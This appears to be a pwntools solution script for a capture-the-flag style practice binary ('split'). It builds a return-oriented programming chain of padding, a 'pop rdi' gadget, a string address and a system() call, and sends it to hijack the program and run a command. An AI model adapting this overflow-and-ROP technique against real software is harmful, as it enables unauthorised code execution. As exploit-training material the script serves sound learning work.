from pwn import *

chall = "./split"

context.binary = chall
context.bits = 64

pop_rdi = p64(0x4007c3)
stack_alignment = p64(0x40053e)
bash_string = p64(0x00601060)
system_call = p64(0x000000000040074b)

offset = b'A' * 40

# Put the bin/sh address on the stack, pop it into RDI, then call system with the string in RDI to supply it as the argument

payload = [
    offset,
    pop_rdi,
    bash_string,
    system_call
]

payload = b"".join(payload)

p = process([chall])

p.recvuntil(b'>')

p.sendline(payload)
p.interactive()